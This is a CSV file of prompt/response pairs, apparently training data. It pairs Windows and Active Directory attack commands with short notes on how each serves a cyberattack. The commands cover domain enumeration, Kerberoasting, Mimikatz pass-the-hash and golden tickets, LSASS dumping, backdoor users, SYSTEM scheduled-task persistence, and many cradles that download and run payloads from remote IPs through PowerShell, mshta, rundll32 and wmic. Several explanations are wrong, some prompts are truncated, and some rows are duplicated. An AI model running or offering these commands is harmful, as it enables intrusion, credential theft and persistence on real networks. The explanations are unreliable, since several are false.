prompt,response
"powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match ""Domain Admins""} | select ObjectDN","This command can be used to find interesting domain ACLs and extract the distinguished name of the objects that have the ""Domain Admins"" group in their ACLs."
powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections,"This command can be used to retrieve the AppLocker policy and its rule collections, which can be useful for an attacker to understand the restrictions in place and potentially bypass them."
"powershell Get-AppLockerPolicy -Domain -LDAP ""LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF}",This command can be used to retrieve the AppLocker policy from a remote domain controller and potentially identify any restrictions or permissions on application execution within the target domain.
"powershell Get-AppLockerPolicy -Domain -LDAP ""LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF}",This command can be used to retrieve the AppLocker policy from a remote domain controller and can be used to gather information about the application whitelisting policy in place on the target machine.
powershell Get-DomainComputer -identity LAPS-COMPUTER -properties ms-Mcs-AdmPwd,"This command can be used to retrieve the Local Administrator Password Solution (LAPS) password for a specific computer in a domain, which can be useful for privilege escalation or lateral movement in a cyberattack on a Windows machine."
powershell Find-LocalAdminAccess,"Potential use: Identify local administrator accounts on a compromised machine.
What it does: Searches for local administrator accounts on the machine using PowerShell."
powershell Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True },"This command can be used to find the location of domain users with local admin access on a Windows machine, which can be useful for privilege escalation in a cyberattack."
powershell Get-DomainUser -SPN | select name,"Potential use: Enumeration of domain users with Service Principal Names (SPNs) for Kerberos attacks.
What it does: Retrieves a list of domain users with SPNs and selects their names for output."
powershell Get-DomainUser -PreauthNotRequired | select name,"Potential use in a cyberattack: Enumeration of domain users who do not require pre-authentication, which can aid in password cracking or lateral movement.

What it might do on a Windows machine: Executes a PowerShell cmdlet to retrieve a list of domain users who do not require pre-authentication and selects their names for output."
"powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match ""RDPUsers""}",This command can be used to find interesting domain ACLs related to RDPUsers group and resolve their GUIDs in PowerShell on a Windows machine.
powershell Get-DomainComputer -Unconstrained,"Potential use: Enumeration of domain computers.
What it does: Retrieves a list of domain computers that are not constrained by the default security settings."
powershell Get-DomainUser -TrustedToAuth | select userprincipalname,"Potential use: Enumeration of domain users.
What it does: Retrieves a list of domain users that are trusted for delegation and selects their user principal names."
powershell Get-DomainComputer -TrustedToAuth | select name,"Potential use in a cyberattack: Enumeration of domain computers for lateral movement.

What it might do on a Windows machine: Retrieves a list of domain computers that have the ""TrustedToAuth"" flag set and selects the name property for display."
powershell Invoke-BloodHound -CollectionMethod All,"This command can be used to gather information about the network and identify potential attack paths, and it will collect data from all available methods in BloodHound on a Windows machine."
powershell Invoke-BloodHound -CollectionMethod LoggedOn,"This command can be used to gather information about the network and identify potential attack paths by querying the Active Directory and mapping out the relationships between users, groups, and computers that are currently logged on to the network."
powershell SharpHound.ps1,"Potential use: Collects information about Active Directory for reconnaissance purposes.
On a Windows machine: Executes a PowerShell script that can gather information about the Active Directory environment."
SharpHound.exe,"SharpHound.exe is a tool used for Active Directory reconnaissance and can be used to gather information about users, groups, computers, and other objects in the domain."
"powershell Get-DomainSPNTicket -SPN ""MSSQLSvc/sqlserver.targetdomain.com""",This command can be used to obtain a Kerberos ticket-granting ticket (TGT) for a specified service principal name (SPN) and can be used in a Pass-the-Ticket attack to gain access to other resources on the network.
"powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""MSSQLSvc/sqlserver.targetdomain.com""",This command can be used to create a Kerberos token for a specific service principal name (SPN) and can be used in a cyberattack to authenticate to a target SQL server in a Windows domain.
"powershell Invoke-Mimikatz -Command '""kerberos::list /export""'",This command can be used to extract Kerberos tickets from memory and can be used in a cyberattack to perform pass-the-hash attacks on other machines in the network.
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi,This command could be used to crack passwords in a cyberattack and gain access to a Windows machine.
powershell Invoke-TokenManipulation -Enumerate,"This command can be used to enumerate all available tokens on a Windows machine, which can be useful for privilege escalation in a cyberattack."
"powershell Invoke-TokenManipulation -ImpersonateUser -Username ""domain\user""","This command can be used to impersonate a user and gain access to their privileges, allowing an attacker to move laterally within a network and potentially escalate their privileges."
"powershell Invoke-TokenManipulation -CreateProcess ""C:\Windows\system32\calc.exe"" -ProcessId 500","This command can be used to create a new process with elevated privileges and execute a malicious payload, in this case, launching the calculator application with the process ID of 500."
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the Administrator account using an RC4 hash of the account's NTLM password, and then inject the resulting ticket into the current user's Kerberos ticket cache for lateral movement."
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the Administrator account using an AES256 hash, and can be used in a cyberattack to gain access to sensitive information on a Windows machine. The /opsec flag is used to bypass security measures, and the /ptt flag is used to execute the ticket in memory without writing to disk."
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe,"This command can be used to obtain a Kerberos ticket-granting ticket (TGT) for the Administrator account using a precomputed NTLM hash, and then launch a new command prompt with the TGT in a network-only context, allowing an attacker to execute commands with elevated privileges without leaving traces on the local machine."
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe,"This command can be used to pass-the-hash and impersonate the Administrator account on a target domain, allowing the attacker to run PowerShell with elevated privileges on the compromised machine."
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,"This command can be used to create a golden ticket for the target domain with the specified user, domain, and SID, using the KRBTGT hash and granting the user ID 500 and group 513 privileges."
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,"This command can be used to create a golden ticket for the Administrator account in the target domain, allowing the attacker to authenticate as that user and access resources in the domain."
mimikatz.exe,"Can be used to extract plaintext passwords, hashes, and Kerberos tickets from memory on a Windows machine."
"schtasks /create /tn ""shell"" /ru ""NT Authority\SYSTEM"" /s dc.targetdomain.com /sc weekly /tr ""Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'""","This command creates a scheduled task named ""shell"" that runs weekly, downloads and executes a PowerShell script from a remote server, and runs it as the SYSTEM user. 

Potential uses in a cyberattack for 'living off the land': 
- Establishing persistence on a compromised machine by scheduling the execution of a malicious script.
- Downloading and executing additional malware or tools from a remote server.
- Running the malicious script with SYSTEM privileges to bypass security controls and gain full access to the system."
"schtasks /create /tn ""shell"" /ru ""NT Authority\SYSTEM"" /s 10.10.10.10 /sc weekly /tr ""Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'""","This command creates a scheduled task named ""shell"" that runs weekly, downloads and executes a PowerShell script from a remote server, and runs it as the SYSTEM user. 

Potential use in a cyberattack: Establishing persistence and remote access to a compromised machine."
"schtasks /RUN /TN ""shell"" /s dc.targetdomain.com","This command can be used to execute a scheduled task named ""shell"" on a remote machine ""dc.targetdomain.com"" and can be used to run malicious code or commands on the target machine."
"schtasks /RUN /TN ""shell"" /s 10.10.10.10","This command can be used to execute a scheduled task named ""shell"" on a remote machine with IP address 10.10.10.10, potentially allowing an attacker to run malicious code or commands on the target machine."
"powershell Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist ""powershell.exe -e $encodedCommand""","This command can be used to remotely execute a PowerShell script encoded in Base64 on a target machine using WMI, allowing an attacker to execute arbitrary code on the target machine."
"powershell Invoke-WmiMethod win32_process -ComputerName 10.10.10.10 -name create -argumentlist ""powershell.exe -e $encodedCommand""","This command can be used to remotely execute PowerShell code on a target machine using WMI, allowing an attacker to run malicious code without needing to drop any files on the target machine."
powershell $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN/targetuser',"This command can be used to create a new PowerShell credential object for a specified domain user, which can then be used to execute commands or scripts with the privileges of that user."
powershell Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname},This command can be used to remotely execute commands on a target machine using PowerShell and can be used to gather information about the target machine such as the current user and hostname.
powershell Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser,"This command can be used to establish a remote PowerShell session with a domain controller in the target domain using the credentials of a specific user, allowing an attacker to execute commands and perform reconnaissance on the target network."
powershell $sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com,"This command can be used to establish a new PowerShell session with a remote computer in the target domain using specified credentials, which can be used to execute commands on the remote machine."
"powershell Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination ""C:\Users\public\""","This command can be used to copy the Invoke-Mimikatz PowerShell script to a remote session and save it to the public folder on the target machine, allowing an attacker to execute the script and potentially extract credentials from memory."
.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com,This command can be used to remotely execute code on a target machine and potentially gain access to sensitive information or control over the system.
.\MS-RPRN.exe \\dc.targetdomain.com \\10.10.10.10,This command can be used to remotely execute code on a target machine and potentially gain access to sensitive information or control over the system.
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the specified user with delegated privileges, potentially allowing an attacker to move laterally within the target domain using the stolen TGT."
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:10.10.10.10 /rc4:2892D26CDF84D7A70E2EB3B9F05C425E,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for a specified user with delegation privileges in a specified domain, potentially allowing an attacker to escalate privileges and move laterally within the network."
kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi,"This command can be used to create a golden ticket attack by forging a Kerberos ticket-granting ticket (TGT) for the target domain using the compromised domain's SID and RC4 hash, allowing the attacker to impersonate any user or service in the target domain."
kerberos::golden /domain:10.10.10.10 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi,"This command can be used to create a golden ticket attack by forging a Kerberos ticket-granting ticket (TGT) for the target domain using the hash of the KRBTGT account and the SID of the target domain, allowing the attacker to impersonate any user in the target domain."
"SharpGPOAbuse.exe --AddComputerTask --TaskName ""Microsoft LEGITIMATE Hotfix"" --Author NT AUTHORITY\SYSTEM --Command ""cmd.exe"" --Arguments ""/c start calc.exe"" --GPOName ""Totally Legit GPO""","This command can be used to add a malicious task to a legitimate GPO, which when executed on a Windows machine, will launch the calculator application as a proof of concept."
"powershell Add-ObjectACL -TargetDistinguishedName ""dc=targetdomain","This command can be used to add an Access Control List (ACL) to a target object in Active Directory, potentially allowing an attacker to gain unauthorized access to sensitive information or systems within the target domain."
powershell Set-RemotePSRemoting -UserName BackdoorUser -ComputerName dc.targetdomain.com,"This command can be used to enable remote PowerShell remoting on a target machine, allowing an attacker to remotely execute commands and potentially establish persistence on the compromised system."
powershell Set-RemoteWMI -UserName BackdoorUser -ComputerName dc.targetdomain.com -namespace 'root\cimv2',This command can be used to remotely set up a backdoor user account on a target domain controller machine using Windows Management Instrumentation (WMI).
"powershell Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name ""RunAsPPL""","This command can be used to check if the ""RunAsPPL"" registry value is enabled, which can be leveraged in a cyberattack to bypass User Account Control (UAC) and gain elevated privileges on a Windows machine."
.\procdump.exe -r -ma lsass.exe lsass.dmp,"This command can be used to dump the memory of the LSASS process, which contains sensitive information such as passwords and credentials, and can be used for further analysis or exploitation."
.\procdump.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens."
.\procdumpx86.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens."
.\procdumpx64.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens."
reg.exe save hklm\security c:\users\public\downloads\security.save,"This command can be used to save the security hive of the Windows Registry to a file, which can then be exfiltrated by an attacker for further analysis or exploitation."
wmic shadowcopy call create Volume='C:\',"This command can be used to create a shadow copy of the C:\ volume, which can be used to backup or restore files, but can also be used by an attacker to access and copy sensitive data without being detected."
.\chisel.exe client 192.168.49.67:80 R:socks,"This command can be used to establish a SOCKS proxy connection to a remote server, which can be used to bypass network restrictions and exfiltrate data from a compromised machine."
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>,"This command can be used to collect information about the domain and its users, groups, computers, and other objects, which can be used for reconnaissance and privilege escalation in a cyberattack. It will run the SharpHound tool with the specified collection method, LDAP credentials, domain information, and output directory."
. .\SharpHound.ps1,"This command executes the SharpHound PowerShell script, which can be used to gather information about Active Directory environments for reconnaissance purposes in a cyberattack."
powershell Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>,"This command can be used to collect information about Active Directory and its relationships, which can be used to plan and execute a privilege escalation attack. It will output the collected data to a specified directory."
powershell Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess,"This command can be used to remotely execute a PowerShell script on a target machine using a specified credential and session, which can be useful for lateral movement and executing malicious code on a compromised machine."
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>,"This command can be used to perform pass-the-hash attacks by impersonating a user and obtaining their NTLM hash, allowing an attacker to authenticate as that user without knowing their password."
mimikatz sekurlsa::minidump c:\temp\lsass.dmp,This command can be used to extract plaintext passwords from the memory of a Windows machine and can be used in a Pass-the-Hash attack.
"powershell Invoke-Mimikatz -Command '""kerberos::list /export""'",This command can be used to extract Kerberos tickets from memory and can be used in a cyberattack to perform pass-the-hash attacks on other machines in the network.
powershell Invoke-Kerberoast,"Can be used to extract Kerberos tickets and crack them offline, potentially leading to privilege escalation."
powershell Get-NetUser -SPN,"Potential use: Enumeration of user accounts and their Service Principal Names (SPNs) for Kerberos authentication.
What it does: Retrieves a list of user accounts and their associated SPNs from the local or remote Windows machine using PowerShell."
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>,"This command can be used to perform a Kerberoasting attack and extract Kerberos tickets for user accounts in the specified domain, with the output saved to a file."
vssadmin list shadows,"Potential use: Finding and accessing shadow copies of files for data exfiltration or recovery.
What it does: Lists all shadow copies of files on the system."
diskshadow list shadows all,"Potential use in a cyberattack: Checking for the presence of shadow copies to delete them and hinder recovery efforts.
What it does on a Windows machine: Lists all available shadow copies on the system."
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\,"This command creates a symbolic link to the shadow copy of a hard disk volume, which could be used to access and exfiltrate sensitive data from a compromised system."
dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll,"This command can be used to load a malicious DLL as a plugin on a DNS server, allowing an attacker to intercept and manipulate DNS traffic."
"powershell Get-SQLServerLinkCrawl -Instace <SPN> -Query ""exec master..xp_cmdshell 'whoami'""","This command can be used to crawl SQL Server links and execute a command to run the ""whoami"" command on the target machine, potentially revealing the current user context of the compromised machine."
whoami /all,"Displays the security context of the current user including the security identifiers (SIDs) and group membership, which can be useful for privilege escalation and lateral movement."
.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002,This command can be used to exploit a vulnerability in Windows to escalate privileges and execute a malicious executable file with SYSTEM level permissions.
.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002 -c '{CLSID}',This command can be used to execute a malicious executable with elevated privileges by exploiting the Windows Component Object Model (COM) and impersonating a privileged user.
".\RoguePotato.exe -r 10.10.14.9 -e ""cmd.exe /c ping 10.10.14.9"" -l 9999","This command can be used to execute a reverse shell and establish a connection with the attacker's machine, allowing them to execute arbitrary commands on the compromised machine and potentially exfiltrate data."
powershell powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1,"This command imports a PowerShell script called Sherlock.ps1 from the specified file path, which could be used to search for vulnerabilities and misconfigurations on a Windows machine during a cyberattack."
\.Watson.exe,"Potential use in a cyberattack: None, it is a legitimate Windows process used for error reporting.
What it might do on a Windows machine: It is responsible for collecting and sending error reports to Microsoft."
powershell Invoke-WebRequest -OutFile index.html -Uri https://superuser.com,"This command can be used to download a webpage and save it as a file on the local machine, potentially allowing an attacker to gather information about the target's browsing habits or steal sensitive information entered on the webpage."
powershell Invoke-WebRequest -OutFile index.html -Uri https://11.10.10.1,"This command can be used to download a file from a remote server and save it locally on the compromised machine, potentially allowing an attacker to exfiltrate sensitive data or install malware."
powershell iwr -outf index.html https://11.101.0.1,"This command downloads the HTML content of a webpage from the specified IP address and saves it as a file named ""index.html"" - it could be used to download malicious code or instructions from a remote server."
bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to download and execute malicious code on the victim's machine."
bitsadmin /transfer myDownloadJob /download /priority normal http://11.10.10.10/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to exfiltrate sensitive data from the victim's machine."
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to exfiltrate sensitive data from the victim machine."
"certutil.exe -urlcache -split -f ""https://10.10.10.10/files/PSTools.zip"" pstools.zip","This command downloads and caches a file from a remote server, which could be used to deliver malicious payloads or tools for lateral movement."
"certutil.exe -urlcache -split -f ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","This command downloads and caches the PSTools.zip file from a remote server, which could be used to execute remote commands and potentially escalate privileges on a compromised machine."
"certutil.exe -urlcache -split -f ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","This command can be used to download and cache a malicious file from a remote server, potentially allowing an attacker to execute malicious code on the compromised machine using the PSTools utility."
"call bitsDownloader.bat ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server using BITS (Background Intelligent Transfer Service) and execute a batch file, potentially allowing an attacker to download and execute malicious files on a compromised machine."
"call bitsDownloader.bat ""https://10.10.10.10/files/PSTools.zip"" pstools.zip",This command can be used to download a file from a remote server using BITS (Background Intelligent Transfer Service) and can be used to download malicious files or tools onto a compromised machine.
"call bitsDownloader.bat ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","Potential use in a cyberattack: Downloading and executing malicious files from a remote server using Background Intelligent Transfer Service (BITS) to evade detection.

What it does on a Windows machine: Calls a batch file to download a file from a specified URL using BITS and saves it as ""pstools.zip""."
"call winhhtpjs.bat ""https://example.com/files/some.zip"" -saveTo ""c:\somezip.zip""","Potential use in a cyberattack: Downloading and executing malicious code from a remote server.

What it might do on a Windows machine: Downloads a file from a specified URL and saves it to a specified location on the local machine."
"call winhhtpjs.bat ""https://10.10.10.10/files/some.zip"" -saveTo ""c:\somezip.zip""","This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to download and execute malicious code on the victim's machine."
"call winhhtpjs.bat ""https://11.11.11.11/files/some.zip"" -saveTo ""c:\somezip.zip""","Potential use in a cyberattack: Downloading and saving a malicious file from a remote server to the victim's machine.
What it does on a Windows machine: Executes a batch file to call the Windows HTTP JavaScript file to download a file from a specified URL and save it to a specified location on the local machine."
"call XMLHTTPDownloadJS.bat ""https://download.sysinternals.com/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, which can be useful for delivering malicious payloads or downloading additional tools for the attacker to use."
"call XMLHTTPDownloadJS.bat ""https://10.10.10.10/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, which can be useful for downloading malicious payloads or tools for lateral movement."
"call XMLHTTPDownloadJS.bat ""https://11.11.11.11/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a zip file from a remote server and save it on the local machine, potentially for use in a later stage of the attack."
"call webclientDownload.bat ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","Potential use: Downloading and executing malicious tools or payloads from a remote server.

What it does: Downloads the PSTools.zip file from the specified URL using the webclientDownload.bat script."
"call webclientDownload.bat ""https://10.10.10.10/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, potentially allowing an attacker to download and execute malicious files on the victim's machine."
"call webclientDownload.bat ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, potentially allowing an attacker to execute malicious code or tools."
powershell $client = New-Object -TypeName System.Net.Http.Httpclient,"This command can be used to create a new HTTP client object in PowerShell, which can be used to send HTTP requests to a server, potentially for exfiltration of data or remote code execution."
powershell [io.file]::WriteAllBytes($file,"This command can be used to write arbitrary bytes to a file, potentially allowing an attacker to modify or corrupt important system files on a Windows machine."
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex""","This command can be used to download and execute a PowerShell script from a remote server using the default network credentials, allowing an attacker to execute arbitrary code on the compromised machine."
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/payload.ps1')|iex""","This command downloads and executes a PowerShell script from a remote server using the default network credentials, potentially allowing an attacker to execute arbitrary code on the compromised machine."
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://11.11.11.11/payload.ps1')|iex""","This command downloads and executes a PowerShell script from a remote server using the default network credentials, potentially allowing an attacker to execute arbitrary code on the compromised machine."
cmd.exe /k < \\webdavserver\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote WebDAV server, potentially allowing an attacker to execute malicious code on a compromised machine."
cmd.exe /k < \\11.11.11.11\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote machine, potentially allowing an attacker to execute malicious code on the target machine."
cmd.exe /k < \\10.10.10.10\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote machine, potentially allowing an attacker to run malicious code on the target machine."
cscript //E:jscript \\webdavserver\folder\payload.txt,"This command can be used to execute a JScript payload stored in a remote WebDAV server, allowing an attacker to remotely execute code on a Windows machine."
cscript //E:jscript \\10.10.10.10\folder\payload.txt,"This command can be used to execute a JScript payload located in a remote folder on a Windows machine, potentially allowing an attacker to gain remote access or execute arbitrary code."
cscript //E:jscript \\11.11.11.11\folder\payload.txt,This command can be used to execute a malicious payload stored in a remote location on a Windows machine using Windows Script Host.
"mshta vbscript:Close(Execute(""GetObject(""""script:http://webserver/payload.sct"""")""))",This command can be used to execute a VBScript payload hosted on a remote web server and can be used for downloading and executing malicious code on a Windows machine.
"mshta vbscript:Close(Execute(""GetObject(""""script:http://10.10.10.10/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the victim's machine."
"mshta vbscript:Close(Execute(""GetObject(""""script:http://11.11.11.11/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to execute arbitrary code on the victim's machine using a trusted Windows utility (mshta.exe)."
mshta http://11.11.11.11/payload.hta,"This command can be used to execute a malicious payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the victim's machine."
mshta http://10.10.10.10/payload.hta,This command can be used to execute a malicious payload hosted on a remote server via HTA (HTML Application) on a Windows machine.
mshta http://webserver/payload.hta,"This command can be used to execute a malicious payload hosted on a remote server, allowing an attacker to gain remote access or execute arbitrary code on the victim's machine."
cscript.exe //E:jscript \\webdavserver\folder\payload.txt,"This command can be used to execute a malicious payload stored in a remote WebDAV server using JScript, allowing an attacker to remotely execute code on a Windows machine."
cscript.exe //E:jscript \\10.10.10.10\folder\payload.txt,This command can be used to execute a malicious payload written in JScript from a remote location on a Windows machine.
cscript.exe //E:jscript \\11.11.11.11\folder\payload.txt,"This command can be used to execute a malicious payload stored in a remote location, allowing an attacker to remotely control the compromised machine."
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://webserver/payload.sct"""")""))",This command can be used to execute a VBScript payload hosted on a remote server and can be used to download and execute malicious code on a Windows machine.
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://10.10.10.10/payload.sct"""")""))","This command can be used to execute a remote script on a victim's machine using mshta.exe, potentially allowing an attacker to download and execute malicious code."
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://11.11.11.11/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the compromised machine using the Windows HTA engine."
mshta.exe http://11.11.11.11/payload.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to gain remote access to the victim's machine."
mshta.exe http://10.10.10.10/payload.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to gain remote access to a Windows machine."
mshta.exe http://webserver/payload.hta,"This command can be used to execute a malicious payload hosted on a remote web server, potentially allowing an attacker to gain remote access to the compromised machine."
rundll32 \\webdavserver\folder\payload.dll,This command can be used to execute a malicious payload stored in a remote WebDAV server on a Windows machine.
rundll32 \\19.19.19.19\folder\payload.dll,This command can be used to execute a malicious payload stored in a remote location on a Windows machine.
rundll32 \\10.10.10.10\folder\payload.dll,"This command can be used to execute a malicious payload stored in a remote location on a network share, allowing an attacker to remotely execute code on a Windows machine."
rundll32.exe \\webdavserver\folder\payload.dll,"This command can be used to execute a malicious payload stored on a remote server via WebDAV, allowing an attacker to remotely execute code on a Windows machine."
rundll32.exe \\19.19.19.19\folder\payload.dll,"This command can be used to execute a payload DLL file located on a remote server, potentially allowing an attacker to gain unauthorized access or execute malicious code on the target machine."
rundll32.exe \\10.10.10.10\folder\payload.dll,"This command can be used to execute a malicious payload stored in a remote location on a network share, allowing an attacker to remotely execute code on a Windows machine."
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.
"wmic os get /format:""https://webserver/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a compromised machine.
"wmic os get /format:""https://10.10.10.10/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a Windows machine.
"wmic os get /format:""https://11.11.11.11/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a compromised machine.
